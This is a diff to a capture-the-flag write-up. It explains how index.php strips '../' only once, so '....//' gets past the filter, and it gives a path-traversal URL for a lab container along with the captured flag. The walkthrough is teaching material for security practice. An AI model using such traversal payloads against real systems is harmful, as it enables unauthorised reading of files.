@@ -40,9 +40,7 @@ Let's take a look at the index file `index.php`:
 We can see it checks if the param `lang` is given and if so it replaces “../” with a blank character.  If we submit “....//”, it becomes “../” allowing path traversal and access to the flag.
 
 ## Exploitation
-With that knowledge we just visit http://[DOCKER-IP]/?lang=....//....//....//flag
-
-Now we just have to read the flag:
+With that knowledge we just visit http://[DOCKER-IP]/?lang=....//....//....//flag and read the flag:
 
 > CHTB{b4d_4li3n_pr0gr4m1ng}
 
